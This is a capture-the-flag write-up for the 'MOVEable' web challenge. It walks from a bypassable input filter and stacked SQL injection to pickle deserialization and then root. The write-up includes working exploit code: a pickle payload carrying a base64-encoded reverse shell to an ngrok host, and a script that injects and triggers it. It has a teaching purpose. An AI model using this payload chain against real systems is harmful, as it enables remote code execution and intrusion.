# MOVEable ❌ (Writeup from LazyTitan33)

## Challenge Description
> ![image](https://github.com/user-attachments/assets/b9f3744a-2bc9-4a64-8a58-b5e05f6e022f)


## Approach
1. Our challenge begins with a straightforward login screen.

   ![image](https://github.com/user-attachments/assets/d45669b2-9c38-4e8b-bc3c-e9abf5925bfb)

Upon inspection, we find that the login code uses a ```DBClean``` function to sanitize input by removing certain characters, though this is far from foolproof.

```python
def DBClean(string):
    for bad_char in " '\"":
        string = string.replace(bad_char,"")
    return string.replace("\\", "'")
```

This function can be bypassed by replacing spaces with ```/**/``` and escaping the single quote with a backslash.

2. Digging further, the login function uses  [executescript](https://docs.python.org/3/library/sqlite3.html#sqlite3.Connection.executescript) rather than execute to handle user input, which opens up a vulnerability for SQL injection attacks. By exploiting this, we can run multiple SQL statements.

```python
@app.route('/login', methods=['POST'])
def login_user():
    username = DBClean(request.form['username'])
    password = DBClean(request.form['password'])
    
    conn = get_db()
    c = conn.cursor()
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    c.executescript(sql)
    user = c.fetchone()
    print(user)
    if user:
        c.execute(f"SELECT sessionid FROM activesessions WHERE username=?", (username,))
        active_session = c.fetchone()
        if active_session:
            session_id = active_session[0]
        else:
            c.execute(f"SELECT username FROM users WHERE username=?", (username,))
            user_name = c.fetchone()
            if user_name:
                session_id = str(uuid.uuid4())
                c.executescript(f"INSERT INTO activesessions (sessionid, timestamp) VALUES ('{session_id}', '{datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')}')")
            else:
                flash("A session could be not be created")
                return logout()
        
        session['username'] = username
        session['session_id'] = session_id
        conn.commit()
        return redirect(url_for('files'))
    else:
        flash('Username or password is incorrect')
        return redirect(url_for('home'))
```

Interestingly, while file uploads are disabled, the `download` endpoint is open and doesn’t require authentication. This endpoint uses pickle.loads to load file data, which we can manipulate through SQL injection to execute arbitrary code. This would allow us to set up a reverse shell.

```python
@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    flash('Sorry, the administrator has temporarily disabled file upload capability.')
    return redirect(url_for('files'))
```

```python
@app.route('/download/<filename>/<sessionid>', methods=['GET'])
def download_file(filename, sessionid):
    conn = get_db()
    c = conn.cursor()
    c.execute(f"SELECT * FROM activesessions WHERE sessionid=?", (sessionid,))
    
    active_session = c.fetchone()
    if active_session is None:
        flash('No active session found')
        return redirect(url_for('home'))
    c.execute(f"SELECT data FROM files WHERE filename=?",(filename,))
    
    file_data = c.fetchone()
    if file_data is None:
        flash('File not found')
        return redirect(url_for('files'))

    file_blob = pickle.loads(base64.b64decode(file_data[0]))
    try:    
        return send_file(io.BytesIO(file_blob), download_name=filename, as_attachment=True)
    except TypeError:
        flash("ERROR: Failed to retrieve file. Are you trying to hack us?!?")
        return redirect(url_for('files'))
```

4. With pickle.loads at our disposal, we can create serialized data that will execute our payload when loaded. Here, we create a class that leverages os.system to open a reverse shell back to our machine:

```python
import base64
import pickle
import os
import requests

class serial():
    def __reduce__(self):               
        return os.system, ('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5ldS5uZ3Jvay5pby8xNTA2NSAwPiYx|base64 -d|bash',)

code = pickle.dumps(serial())
code = base64.b64encode(code)
revshell = code.decode()
```
5. Next, we send a crafted SQL injection payload through the login route, inserting our serialized reverse shell data into the database, and then trigger the download endpoint to execute it:

```python
url = 'http://challenge.ctf.games:32766/login'
header = {'Content-Type':'application/x-www-form-urlencoded'}
data = '''username=s&password=\\';INSERT/**/INTO/**/activesessions/**/VALUES(\\'lazytitan\\',\\'lazytitan\\',\\'time\\');INSERT/**/INTO/**/files/**/VALUES(\\'payload\\',\\'%s\\',NULL);--";''' % revshell
requests.post(url, data=data, headers=header)

url2 = 'http://challenge.ctf.games:32766/download/payload/lazytitan'
requests.get(url2)
```

5. Once the reverse shell is active, we check our sudo permissions and find that we can run all commands as root without requiring a password. A quick sudo bash gives us root access, where we find the flag:

![image](https://github.com/user-attachments/assets/16defa32-0711-41bd-94d6-167e42be516e)

`flag{ac53cd7aa8a2d1b2340a6eb4a356709e}`




   
